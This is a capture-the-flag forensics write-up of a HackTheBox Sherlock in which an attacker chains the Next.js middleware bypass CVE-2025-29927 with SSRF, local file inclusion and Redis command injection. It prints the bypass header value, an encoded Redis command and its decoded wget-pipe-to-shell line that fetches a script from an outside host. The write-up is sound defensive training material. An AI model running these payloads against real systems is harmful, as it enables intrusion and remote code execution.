# [HackTheBox Sherlocks - NeuroSync-D](https://app.hackthebox.com/sherlocks/NeuroSync-D)
![88c28e4ff83a53a51595847681cbfab9.png](/resources/88c28e4ff83a53a51595847681cbfab9.png)
**Scenario:**
NeuroSync™ is a leading suite of products focusing on developing cutting edge medical BCI devices, designed by the Korosaki Coorporaton. Recently, an APT group targeted them and was able to infiltrate their infrastructure and is now moving laterally to compromise more systems. It appears that they have even managed to hijack a large number of online devices by exploiting an N-day vulnerability. Your task is to find out how they were able to compromise the infrastructure and understand how to secure it.

* * *
![a0cde20a073d5ec4a92ea8306e851214.png](/resources/a0cde20a073d5ec4a92ea8306e851214.png)

On this sherlock, we will have to dig into how the Next.js middleware bypass could be exploited and could be chained for SSRF, Local File Inclusion and command execution on Redis! 

we will have 5 log files to investigate from
1. `access.log`: This is typically a web server log which records every HTTP/S request made to the system.
2. `bci-device.log`: This is likely a custom log related to a **BCI** (Brain-Computer Interface) or a similarly named device/system. It logs interactions between the software and the physical or virtual device.
3. `data-api.log`: Log file from a backend API that handles data requests.
4. `interface.log`: This tracks what’s happening on the user interface (GUI or CLI). It logs how users interact with the system or app front-end.
5. `redis.log`: Logs from Redis, an in-memory database often used for caching, session storage, or real-time data.

>Task 1: What version of Next.js is the application using?

![ade2336486fb2cece942c8e6419515fd.png](/resources/ade2336486fb2cece942c8e6419515fd.png)

Since Next.js is React-based full-stack framework so we could inspect the `interface.log` to find out the version and also the local port that Next.js-based application was running on the server as shown in the image above.

```
15.1.0
```

>Task 2: What local port is the Next.js-based application running on?
```
3000
```

>Task 3: A critical Next.js vulnerability was released in March 2025, and this version appears to be affected. What is the CVE identifier for this vulnerability?

![c28e0a8bb94a5d569e8131cc270e10eb.png](/resources/c28e0a8bb94a5d569e8131cc270e10eb.png)

In March 2025, the new Next.js middleware bypass vulnerability was disclosed with **9.1 CVSS** score which threat actor/attack can send the `x-middleware-subrequest` header that meant to be used internally with a specific value to **trick the application into treating them as internal subrequests** which effectively bypass middleware authorization and access the endpoint/resources that are not intended to be accessed without proper authorization.  

![b16cd9bed4c7da3d6f3d5b6274acc801.png](/resources/b16cd9bed4c7da3d6f3d5b6274acc801.png)

An article published on [Project Discovery](https://projectdiscovery.io/blog/nextjs-middleware-authorization-bypass) also provides different values that could be used with `x-middleware-subrequest` header on different version of vulnerable Next.js and also provides Nuclei template to discover this vulnerability.

![435ca2036c9e979fd31214f254a1f89b.png](/resources/435ca2036c9e979fd31214f254a1f89b.png)

The article also explained how this template works which will help us on this sherlock as well! 

```
CVE-2025-29927
```

>Task 4: The attacker tried to enumerate some static files that are typically available in the Next.js framework, most likely to retrieve its version. What is the first file he could get?

![0196e129488dfc2a15e293bd767e363e.png](/resources/0196e129488dfc2a15e293bd767e363e.png)

Lets check out the `access.log` file which we can see that there is only a single IP address that interacted with the Next.js application.

![a003ff40df544beda7fe95b4c093bd80.png](/resources/a003ff40df544beda7fe95b4c093bd80.png)

Then we can read the content of the log file which we can see that the first HTTP response beside `/` happened at 11:37:44.

```
main-app.js
```

>Task 5: Then the attacker appears to have found an endpoint that is potentially affected by the previously identified vulnerability. What is that endpoint?

![52b6df7a7764762f1d9e4af57084d7db.png](/resources/52b6df7a7764762f1d9e4af57084d7db.png)

We can see that after the attacker discovered main page of this Next.js application, an api endpoint was requested constantly by the attacker and the first 5 requests are resulted in Unauthorized response.

```
/api/bci/analytics
```

>Task 6: How many requests to this endpoint have resulted in an "Unauthorized" response?

![2ff32fe9e1570a4940e1262c1038b803.png](/resources/2ff32fe9e1570a4940e1262c1038b803.png)

We know that the first 5 request to this api endpoint resulted in Unauthorized response but is there more?, the result from `grep 401 access.log` command shows that there are no more than this.

```
5
```

>Task 7: When is a successful response received from the vulnerable endpoint, meaning that the middleware has been bypassed?

![89447a341e7c1d699735e7065a4b9a47.png](/resources/89447a341e7c1d699735e7065a4b9a47.png)

Then after those 5 unauthorized access, HTTP 200 status was seen from the 6th request and the rest and it indicates that the middleware authorization has been bypassed according to Nuclei template provides by [Project Discovery](https://projectdiscovery.io/blog/nextjs-middleware-authorization-bypass).

```
2025-04-01 11:38:05
```

>Task 8: Given the previous failed requests, what will most likely be the final value for the vulnerable header used to exploit the vulnerability and bypass the middleware?

![8fee94ba380637d33571ea851dc3ceae.png](/resources/8fee94ba380637d33571ea851dc3ceae.png)

Since the Next.js running on this application is 15.1 which mean the value of `x-middleware-subrequest` header has to be `middleware:middleware:middleware:middleware:middleware` to actually get to trigger this vulnerability 

and from `interface.log`, we can see that there are 4 attempts trying to get this vulnerability to work which was resulting to successfully exploited this vulnerability at the end.

```
x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
```

>Task 9: The attacker chained the vulnerability with an SSRF attack, which allowed them to perform an internal port scan and discover an internal API. On which port is the API accessible?

![1b09ac335741eb728aaeee9d8f8aacb9.png](/resources/1b09ac335741eb728aaeee9d8f8aacb9.png)

We can inspect the `data-api.log` file which we can see that the attacker used curl to trigger SSRF vulnerability and discovered another internal API on port 4000 which attacker then proceed to find other endpoint on this API.

```
4000
```

>Task 10: After the port scan, the attacker starts a brute-force attack to find some vulnerable endpoints in the previously identified API. Which vulnerable endpoint was found?

![f7042475e8f34040c76a5a282b19ce86.png](/resources/f7042475e8f34040c76a5a282b19ce86.png)

We could keep scrolling until we finally see the payload that resemble Local File Inclusion vulnerability exploitation payload from `/logs` endpoint which attacker found that he could leverage `logFile` variable on this endpoint to list file from the server.

```
/logs
```

>Task 11: When the vulnerable endpoint found was used maliciously for the first time?

![f7042475e8f34040c76a5a282b19ce86.png](/resources/f7042475e8f34040c76a5a282b19ce86.png)

We can see that the attacker started with `/etc/passwd` first then went to `/proc/self/environ` later.

```
2025-04-01 11:39:01
```

>Task 12: What is the attack name the endpoint is vulnerable to?
```
Local File Inclusion
```

>Task 13: What is the name of the file that was targeted the last time the vulnerable endpoint was exploited?

![b796692387a8c743b2a92719f7da58d6.png](/resources/b796692387a8c743b2a92719f7da58d6.png)

Lastly the attacker then used LFI to get secret key file from tmp directory before went to access Redis with the key obtained.

```
secret.key
```

>Task 14: Finally, the attacker uses the sensitive information obtained earlier to create a special command that allows them to perform Redis injection and gain RCE on the system. What is the command string?

![79efce5295123a9c70b884785a597551.png](/resources/79efce5295123a9c70b884785a597551.png)

From redis log, we can see that the attacker executed base64 command after he successfully compromised secret key to access Redis.

```
OS_EXEC|d2dldCBodHRwOi8vMTg1LjIwMi4yLjE0Ny9oNFBsbjQvcnVuLnNoIC1PLSB8IHNo|f1f0c1feadb5abc79e700cac7ac63cccf91e818ecf693ad7073e3a448fa13bbb
```

>Task 15: Once decoded, what is the command?

![04e2d568d2a8e4db3133366bbbec8cbb.png](/resources/04e2d568d2a8e4db3133366bbbec8cbb.png)

We can copy the base64 to decode it directly with CyberChef which we can see that the attacker trying to fetch the bash script from C2 and execute it.

![7c3c171fd417253729cad642ed03a045.png](/resources/7c3c171fd417253729cad642ed03a045.png)

We could also find the same command from `bci-device.log` which gave us an extra context that this command did not work due to the missing `wget` binary on the server.

```
wget http://185.202.2.147/h4Pln4/run.sh -O- | sh
```

https://labs.hackthebox.com/achievement/sherlock/1438364/879

And now we are done!
* * *
